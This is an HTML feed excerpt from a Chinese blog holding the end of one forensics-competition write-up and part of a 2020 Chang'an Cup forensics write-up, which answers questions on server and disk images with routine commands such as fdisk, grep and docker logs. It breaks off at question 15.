&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250815211941873.png&#34; alt=&#34;image-20250815211941873&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;19850214
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;70通过取证调查结果进行分析包括但不限于以上问题及情节林浚熙的行为涉及哪一种罪案&#34;&gt;70.通过取证调查结果进行分析(包括但不限于以上问题及情节)，林浚熙的行为涉及哪一种罪案?
&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;A.传送儿童色情物品&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;B.抢劫&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;C.诈骗&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;D.勒索金钱&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;E.购买毒品&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;最好玩的一题&lt;/p&gt;
&lt;p&gt;C是对李大辉&lt;/p&gt;
&lt;p&gt;D是对王晓琳&lt;/p&gt;
&lt;p&gt;E是在林俊熙电脑里面的signal可以看见溜冰的记录：

&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250815212505751&#34; href=&#34;http://picture.928330.xyz/typora/image-20250815212505751.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250815212505751.png&#34; alt=&#34;image-20250815212505751&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;p&gt;死罪！！！！&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;CDE
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;hr&gt;
&lt;p&gt;总算做完了，这套题是处处透露着诡异，个别题目意义不明，难度两极分化，选择题太多，根据选项才能得到结果，不根据选项又白白浪费提示，要绕很大一圈&lt;/p&gt;
&lt;p&gt;不过整体来说过程还是很清楚的，好玩还是挺好玩&lt;/p&gt;
</description>
        </item>
        <item>
        <title>长安杯2020取证总结</title>
        <link>https://blog.928330.xyz/p/%E9%95%BF%E5%AE%89%E6%9D%AF2020%E5%8F%96%E8%AF%81%E6%80%BB%E7%BB%93/</link>
        <pubDate>Sat, 26 Jul 2025 13:22:12 +0800</pubDate>
        
        <guid>https://blog.928330.xyz/p/%E9%95%BF%E5%AE%89%E6%9D%AF2020%E5%8F%96%E8%AF%81%E6%80%BB%E7%BB%93/</guid>
        <description>&lt;img src="http://picture.928330.xyz/typora/f99f347d5c5b4907bc54e0e6b9b714e8.png" alt="Featured image of post 长安杯2020取证总结" /&gt;&lt;p&gt;题目：https://ks.wjx.top/vj/rX5h1WB.aspx&lt;/p&gt;
&lt;p&gt;难难难，不多说了，直接开始&lt;/p&gt;
&lt;h1 id=&#34;火眼仿真创建虚拟机&#34;&gt;火眼仿真创建虚拟机
&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;要创建虚拟机，必须要有VMware环境&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;创建虚拟机 -&amp;gt; 添加镜像 -&amp;gt; 选择镜像文件之后在上面勾选对应镜像 -&amp;gt; 点击确定&lt;/p&gt;
&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250718183524621&#34; href=&#34;http://picture.928330.xyz/typora/image-20250718183524621.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250718183524621.png&#34; alt=&#34;image-20250718183524621&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;p&gt;选择生成位置（虚拟机位置） -&amp;gt; 开始创建&lt;/p&gt;
&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250718184121267&#34; href=&#34;http://picture.928330.xyz/typora/image-20250718184121267.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250718184121267.png&#34; alt=&#34;image-20250718184121267&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;创建完成之后会给出账号密码，可以记忆一下，或者重置为空（推荐）&lt;/strong&gt;&lt;/p&gt;
&lt;h1 id=&#34;part1&#34;&gt;part1
&lt;/h1&gt;&lt;h2 id=&#34;1检材1的操作系统版本是&#34;&gt;1.检材1的操作系统版本是
&lt;/h2&gt;&lt;p&gt;创建完虚拟机后，就会自动识别出系统版本：&lt;/p&gt;
&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250718184504405&#34; href=&#34;http://picture.928330.xyz/typora/image-20250718184504405.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250718184504405.png&#34; alt=&#34;image-20250718184504405&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;CentOS Linux release 7.6.1810(Core)
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;2检材1中操作系统的内核版本是&#34;&gt;2.检材1中，操作系统的内核版本是
&lt;/h2&gt;&lt;p&gt;找半天不知道检材1怎么登录的root账号，结果最后试出来了密码&amp;hellip;&amp;hellip;：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;root/123456
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;后面才知道这是火眼帮我改的，我们也可以手动设置&lt;/p&gt;
&lt;p&gt;创建虚拟机 -&amp;gt; 高级设置：&lt;/p&gt;
&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250813174601944&#34; href=&#34;http://picture.928330.xyz/typora/image-20250813174601944.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250813174601944.png&#34; alt=&#34;image-20250813174601944&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;p&gt;这里就可以设置各种内容&lt;/p&gt;
&lt;p&gt;纯命令行界面还是太难操作了，使用Xterminal连接一下&lt;/p&gt;
&lt;p&gt;&lt;code&gt;systemctl start sshd&lt;/code&gt;打开服务，看一下监听端口，是7001：&lt;/p&gt;
&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250718200048433&#34; href=&#34;http://picture.928330.xyz/typora/image-20250718200048433.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250718200048433.png&#34; alt=&#34;image-20250718200048433&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;p&gt;在Xterminal连接后，查看内核版本：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;uname -r
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250718200436726&#34; href=&#34;http://picture.928330.xyz/typora/image-20250718200436726.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250718200436726.png&#34; alt=&#34;image-20250718200436726&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;3.10.0-957.el7.x86_64
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;3检材1磁盘包含一个lvm逻辑卷该lvm开始的逻辑区块地址lba是&#34;&gt;3.检材1磁盘包含一个LVM逻辑卷，该LVM开始的逻辑区块地址（LBA）是
&lt;/h2&gt;&lt;p&gt;查看磁盘分区：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;fdisk -l
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250718200859043&#34; href=&#34;http://picture.928330.xyz/typora/image-20250718200859043.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250718200859043.png&#34; alt=&#34;image-20250718200859043&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;p&gt;根据System字段类型里的LVM判断/dev/sda2是我们要找的分区&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;2099200
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;4检材1中网站wwwkkzjccom对应的web服务对外开放的端口是&#34;&gt;4.检材1中网站&amp;quot;www.kkzjc.com&amp;quot;对应的Web服务对外开放的端口是
&lt;/h2&gt;&lt;p&gt;尝试使用nmap扫描服务器端口，但没有给出什么有用的信息&lt;/p&gt;
&lt;p&gt;使用grep命令直接在服务器上搜索&amp;quot;www.kkzjc.com&amp;quot;&lt;/p&gt;
&lt;p&gt;因为是网站的配置文件通常在 /etc目录下，现在/etc下搜索更快一点：&lt;/p&gt;
&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250718201857226&#34; href=&#34;http://picture.928330.xyz/typora/image-20250718201857226.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250718201857226.png&#34; alt=&#34;image-20250718201857226&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;32000
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;5检材1所在的服务器共绑定了几个对外开放的域名&#34;&gt;5.检材1所在的服务器共绑定了几个对外开放的域名
&lt;/h2&gt;&lt;p&gt;既然/etc下有配置文件，就把nginx和apache的都搜一遍：

&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250718202418703&#34; href=&#34;http://picture.928330.xyz/typora/image-20250718202418703.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250718202418703.png&#34; alt=&#34;image-20250718202418703&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;p&gt;看来只有nginx，一共开放了三个域名&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;3
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;6检材1所在的服务器的原始ip地址是&#34;&gt;6.检材1所在的服务器的原始IP地址是
&lt;/h2&gt;&lt;p&gt;看不明白这一题问的是什么，跟着wp做一遍&lt;/p&gt;
&lt;p&gt;见第九题&lt;/p&gt;
&lt;h2 id=&#34;7嫌疑人曾经远程登录过检材1所在的服务器分析并找出其登录使用的ip地址是-并使用该地址解压检材2&#34;&gt;7.嫌疑人曾经远程登录过检材1所在的服务器，分析并找出其登录使用的IP地址是 (并使用该地址解压检材2)
&lt;/h2&gt;&lt;p&gt;使用last命令查看，发现有两个ip登陆过该服务器（192.168.204.1是我使用Xterminal连接的）：

&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250719091934927&#34; href=&#34;http://picture.928330.xyz/typora/image-20250719091934927.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250719091934927.png&#34; alt=&#34;image-20250719091934927&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;p&gt;正确的ip可以解压检材2，检材2是分卷压缩，使用winrar解压缩&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;192.168.99.222
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;8检材1所在的服务器其主要功能之一为反向代理找出wwwkkzjccom转发的后台网站所使用的ip地址是&#34;&gt;8.检材1所在的服务器，其主要功能之一为反向代理。找出&amp;quot;www.kkzjc.com&amp;quot;转发的后台网站所使用的IP地址是
&lt;/h2&gt;&lt;p&gt;首先查看命令行history，发现该服务器有docker镜像：

&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250719085251683&#34; href=&#34;http://picture.928330.xyz/typora/image-20250719085251683.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250719085251683.png&#34; alt=&#34;image-20250719085251683&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;p&gt;开启docker服务，看一眼镜像和容器都有哪些&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;systemctl start docker
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;systemctl status docker
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;docker images
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;docker ps
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;这里发现一个正在运行的nginx服务器，而且他的映射到本机的端口号是8091，和第四题配置文件中的一样：&lt;/p&gt;
&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250719085438222&#34; href=&#34;http://picture.928330.xyz/typora/image-20250719085438222.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250719085438222.png&#34; alt=&#34;image-20250719085438222&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;p&gt;进入docker的交互式终端，查看该终端里运行过的命令：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;docker &lt;span style=&#34;color:#e5c07b&#34;&gt;exec&lt;/span&gt; -it 08f64376a2e3 /bin/bash
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e5c07b&#34;&gt;history&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;可以看到曾经多次查看过配置文件/etc/nginx/conf.d/hl.conf：&lt;/p&gt;
&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250719085752115&#34; href=&#34;http://picture.928330.xyz/typora/image-20250719085752115.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250719085752115.png&#34; alt=&#34;image-20250719085752115&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;p&gt;我们也打开这个配置文件看看，发现了反向代理的ip：&lt;/p&gt;
&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250719090911712&#34; href=&#34;http://picture.928330.xyz/typora/image-20250719090911712.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250719090911712.png&#34; alt=&#34;image-20250719090911712&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;192.168.1.176
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;9嫌疑人曾经从题7的ip地址通过web方式远程访问过网站统计出检材1中该ip出现的次数为&#34;&gt;9.嫌疑人曾经从题7的IP地址，通过WEB方式远程访问过网站，统计出检材1中该IP出现的次数为
&lt;/h2&gt;&lt;p&gt;查看docker容器日志，统计其中的ip出现次数，&lt;code&gt;-c&lt;/code&gt;参数可输出统计总数：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;docker logs 08f6437 | grep -c &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;192.168.99.222&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250719092642267&#34; href=&#34;http://picture.928330.xyz/typora/image-20250719092642267.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250719092642267.png&#34; alt=&#34;image-20250719092642267&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;18
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;同时在日志还能发现这个ip在访问服务器的时候是由ip&lt;code&gt;192.168.99.3&lt;/code&gt;接受的，且端口号就是之前的8091：&lt;/p&gt;
&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250719092746380&#34; href=&#34;http://picture.928330.xyz/typora/image-20250719092746380.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250719092746380.png&#34; alt=&#34;image-20250719092746380&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;p&gt;这样就发现了题6的答案：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;192.168.99.3
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;part2&#34;&gt;part2
&lt;/h1&gt;&lt;h2 id=&#34;10检材-2-的原始磁盘-sha256-值为&#34;&gt;10.检材 2 的原始磁盘 SHA256 值为
&lt;/h2&gt;&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250721164754428&#34; href=&#34;http://picture.928330.xyz/typora/image-20250721164754428.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250721164754428.png&#34; alt=&#34;image-20250721164754428&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250721164815812&#34; href=&#34;http://picture.928330.xyz/typora/image-20250721164815812.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250721164815812.png&#34; alt=&#34;image-20250721164815812&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;2D926D5E1CFE27553AE59B6152E038560D64E7837ECCAD30F2FBAD5052FABF37
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;11检材2-所在计算机的os内部版本号是&#34;&gt;11.检材2 所在计算机的OS内部版本号是
&lt;/h2&gt;&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250721132044713&#34; href=&#34;http://picture.928330.xyz/typora/image-20250721132044713.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250721132044713.png&#34; alt=&#34;image-20250721132044713&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;18363.1082
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;12检材2所在计算机最后一次正常关机的时间为精确到秒&#34;&gt;12.检材2所在计算机最后一次正常关机的时间为（精确到秒）
&lt;/h2&gt;&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250721132229362&#34; href=&#34;http://picture.928330.xyz/typora/image-20250721132229362.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250721132229362.png&#34; alt=&#34;image-20250721132229362&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;2020-09-22 13:15:34
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;13-检材2中vmware-程序的安装时间为精确到分钟&#34;&gt;13. 检材2中，VMware 程序的安装时间为（精确到分钟）
&lt;/h2&gt;&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250721132346299&#34; href=&#34;http://picture.928330.xyz/typora/image-20250721132346299.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250721132346299.png&#34; alt=&#34;image-20250721132346299&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;2020-09-18 17:57
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;14检材2中vmwareexe程序总计启动过几次&#34;&gt;14.检材2中，Vmware.exe程序总计启动过几次
&lt;/h2&gt;&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250721172714596&#34; href=&#34;http://picture.928330.xyz/typora/image-20250721172714596.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250721172714596.png&#34; alt=&#34;image-20250721172714596&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;8
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;15嫌疑人通过-web-方式从检材2访问检材1所在的服务器上的网站时连接的目标端口是&#34;&gt;15.嫌疑人通过 Web 方式，从检材2访问检材1所在的服务器上的网站时，连接的目标端口是
&lt;/h2&gt;&lt;p&gt;在chrome浏览器中发现代理登录的记录：&lt;/p&gt;
&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250721173144057&#34; href=&#34;http://picture.928330.xyz/typora/image-20250721173144057.png&#34;&gt;
